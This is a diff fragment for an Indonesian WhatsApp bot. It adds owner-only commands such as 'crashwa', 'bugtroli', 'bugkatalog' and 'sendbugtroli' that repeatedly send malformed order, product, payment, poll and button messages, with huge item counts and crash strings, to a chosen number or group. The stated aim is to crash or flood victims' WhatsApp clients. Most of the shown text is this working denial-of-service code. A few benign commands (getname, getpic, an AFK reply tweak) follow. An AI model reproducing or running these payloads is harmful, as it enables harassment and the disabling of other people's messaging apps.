+alpha.relayMessage(nomor, troli.message, { messageId: troli.key.id })
+await sleep(60* secon)
+}
+}
+break
+case 'sendbugtroligc': {
+ if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+let memek = text.split("|")[0]+'@g.us'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+a = await paytod(`Succes send bug Troli Ke ${nomor} Sebanyak ${jumlah} kali dengan waktu ${secon} detik`)
+for (let i = 0; i < jumlah ; i++){
+var troligc = generateWAMessageFromContent(nomor, proto.Message.fromObject({
+"orderMessage": {
+                  "sellerJid": "6282134110253@s.whatsapp.net",
+                  "itemCount": 7777777,
+                  "message": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ`,
+                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗",
+                  "thumbnail": fs.readFileSync("./image/virgam.jpeg")
+}
+}), { userJid: m.chat, quoted: fbugtroli })
+alpha.relayMessage(nomor, troligc.message, { messageId: troligc.key.id })
+await sleep(60* secon)
+}
+}
+break
+case 'sendbugbutton': {
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+let memek = text.split("|")[0]+'@s.whatsapp.net'
+let nomor = memek.replace(" ", "")
+jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+for (let i = 0; i < jumlah ; i++){
+alpha.sendButMessage(nomor, 'BUG BUTTON AMPAS', `© ${ownername}`, [{buttonId: 'SHINCHAN XD', buttonText: {displayText: `${buttonvirus}`}, type: 1},{buttonId: 'SHINCHAN XD', buttonText: {displayText: `${buttonvirus}`}, type: 1},{buttonId: 'SHINCHAN XD', buttonText: {displayText: `${buttonvirus}`}, type: 1}], {quoted: fbugtroli})
+await sleep(60* secon)
+}
+}
+break
+case 'sendbugbuttongc': {
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+let memek = text.split("|")[0]+'@g.us'
+let nomor = memek.replace(" ", "")
+jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+for (let i = 0; i < jumlah ; i++){
+alpha.sendButMessage(nomor, 'BUG BUTTON AMPAS', `© ${ownername}`, [{buttonId: 'SHINCHAN XD', buttonText: {displayText: `${buttonvirus}`}, type: 1},{buttonId: 'SHINCHAN XD', buttonText: {displayText: `${buttonvirus}`}, type: 1},{buttonId: 'SHINCHAN XD', buttonText: {displayText: `${buttonvirus}`}, type: 1}], {quoted: fbugtroli})
+await sleep(60* secon)
+}
+}
+break
+//===================BUG GC OLD=========================//
+case 'bugbutton': {
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+for (let i = 0; i < jumlah ; i++){
+alpha.sendButMessage(from, 'BUG BUTTON AMPAS', `© ${ownername}`, [{buttonId: 'SHINCHAN XD', buttonText: {displayText: `${buttonvirus}`}, type: 1},{buttonId: 'SHINCHAN XD', buttonText: {displayText: `${buttonvirus}`}, type: 1},{buttonId: 'SHINCHAN XD', buttonText: {displayText: `${buttonvirus}`}, type: 1},], {quoted: fbugtroli})
+await sleep(60* secon)
+}
+}
+break
+case 'crashwa': {
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+for (let i = 0; i < jumlah ; i++){
+await alpha.sendMessage(m.chat, { 
+text: '⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³', 
+templateButtons: [
+{ callButton: { displayText: `OWNER`, phoneNumber: `6282134110253`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `6282134110253`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `6282134110253`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `6282134110253`}},
+{ urlButton: { displayText: `GROUP SHINCHAN`, url: `https://chat.whatsapp.com/J4vxirLBZ5K7hKZWe0Vm8q`}},
+{ urlButton: { displayText: `GROUP SHINCHAN`, url: `https://chat.whatsapp.com/J4vxirLBZ5K7hKZWe0Vm8q`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN XD`, id: `⫹⫺ ʙᴜɢ ɴᴇᴡ ᴇʀᴀ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN XD`, id: `⫹⫺ ʙᴜɢ ɴᴇᴡ ᴇʀᴀ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN XD`, id: `⫹⫺ ʙᴜɢ ɴᴇᴡ ᴇʀᴀ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN XD`, id: `⫹⫺ ʙᴜɢ ɴᴇᴡ ᴇʀᴀ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN GANTENG`, id: `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ`}},
+]
+ })
+ await sleep(60* secon)
+}
+}
+break
+case 'bugaudio': {
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+for (let i = 0; i < jumlah ; i++){
+var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"audioMessage": {
+						"url": "https://mmg.whatsapp.net/d/f/AtvXn5Bb76rR9uYiXjBd0u5py_aKLhNmP2rhruiO184w.enc",
+						"mimetype": "audio/mpeg",
+						"fileSha256": "xRdNvEI+QPro9BTPTCqr8MCBQnHXSPwd+8pIr11jEEA=",
+						"fileLength": "508866",
+						"seconds": 11,
+						"ptt": false,
+						"mediaKey": "3mpwldA7aDzUyupv+VxiVJuyIprx4ViIld03qSEO9Z4=",
+						"fileEncSha256": "iS7SrciqKZ0O/2vMz1DVYpjxurXmCGsDS9d8vtYQKjA=",
+						"directPath": "/v/t62.7114-24/40814954_658794068999726_27489807458198261_n.enc?ccb=11-4&oh=01_AVz6VQtXvHU48YtDIMnKJCETu_Rgte-RQV8eriztjlFAMQ&oe=6358CE0B",
+						"mediaKeyTimestamp": "1664359148"
+}
+}), { userJid: m.chat, quoted: fbugtroli })
+alpha.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
+await sleep(60* secon)
+}
+}
+break
+case 'bugpay': {
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+for (let i = 0; i < jumlah ; i++){
+alpha.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡʜᴀᴛꜱᴀᴩᴩ`, currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: pp_bot }}}}, { quoted : fbugtroli })
+await sleep(60* secon)
+}
+}
+break
+case 'bugtroli': {
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+let shinchan = text.split("|")[0]
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+for (let i = 0; i < jumlah ; i++){
+var troligc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"orderMessage": {
+                  "sellerJid": "6282134110253@s.whatsapp.net",
+                  "itemCount": 7777777,
+                  "message": `⫹⫺ ${shinchan}`,
+                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗",
+                  "thumbnail": fs.readFileSync("./image/virgam.jpeg")
+}
+}), { userJid: m.chat, quoted: fbugtroli })
+alpha.relayMessage(m.chat, troligc.message, { messageId: troligc.key.id })
+await sleep(60* secon)
+}
+}
+break
+case 'bugpolling': {
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+for (let i = 0; i < jumlah ; i++){
+var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"pollCreationMessage": {
+"name": "Assalamualaikum💖🐼",
+"options": [
+	{
+"optionName": "Waalaikumsalam🐼"
+	},
+	{
+"optionName": "Iyha Waalaikumsalam😏"
+	}
+],
+"selectableOptionsCount": 2
+	}
+}), { userJid: m.chat, quoted: fbugtroli })
+alpha.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
+await sleep(60* secon)
+}
+}
+break
+case 'bugkatalog': {
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+const ktedh = await reSize(pp_bot, 200, 200)
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+for (let i = 0; i < jumlah ; i++){
+var messa = await prepareWAMessageMedia({ image: ktedh }, { upload: alpha.waUploadToServer })
+var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"productMessage": {
+"product": {
+"productImage": messa.imageMessage,
+"productId": "99",
+"title": `〔 ıll ☄︎ ⫹⫺ ᴺᵉʳᵒ☃︎ˢᵉⁿᵖᵃⁱ 浤 ☄︎ llı 〕${philips}`,
+"description": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡʜᴀᴛꜱᴀᴩᴩ ${vapi()}`,
+"productImageCount": 999999999,
+"firstImageId": 1,
+"retailerId": `〔 ıll ☄︎ ⫹⫺ ᴺᵉʳᵒ☃︎ˢᵉⁿᵖᵃⁱ 浤 ☄︎ llı 〕`
+},
+"businessOwnerJid": "6282134110253@s.whatsapp.net",
+}
+}), { userJid: m.chat, quoted: fbugtroli })
+alpha.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
+await sleep(60* secon)
+}
+}
+break
+//===================BUG BY SHINCHAN XD=========================//
             case 'owner': case 'creator': {
                 alpha.sendContact(m.chat, global.owner, m)
             }
@@ -1711,7 +2478,7 @@ if (!m.isGroup) return reply(lang.groupOnly())
 let user = db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-reply(lang.TbAfk(pushname, text))
+paytod(lang.TbAfk(pushname, text))
 }
 break  
 case 'family100': {
@@ -2046,6 +2813,36 @@ const buttojns = [
 						}
 					}
 					break    
+					case 'getname': {
+if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+if (qtod === "true") {
+namenye = await alpha.getName(m.quoted.sender)
+reply(namenye)
+} else if (qtod === "false") {
+alpha.sendMessage(from, {text:"Reply orangnya"}, {quoted:hw})
+}
+}
+break
+//=================================================//
+case 'getpic': {
+if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+if (qtod === "true") {
+try {
+pporg = await alpha.profilePictureUrl(m.quoted.sender, 'image')
+} catch {
+pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+}
+alpha.sendMessage(m.chat, { image : { url : pporg }, caption:`Done` }, { quoted : m })
+} else if (qtod === "false") {
+try {
+pporgs = await alpha.profilePictureUrl(from, 'image')
+} catch {
+pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+}
+alpha.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quoted : m })
+}
+}
+break    
 	case 'allmenu':{
 		await alpha.sendButLoc(m.chat,  `Hai kak ${pushname} 👋, saya *${botname}* ` + '\n\n' + lang.listMenu(time, salam, pushname, prefix)  , '©' + ownername, pp_bot, [
 {buttonId: `.owner` , buttonText: {displayText: '🙍‍♂️ Owner'}, type: 1},
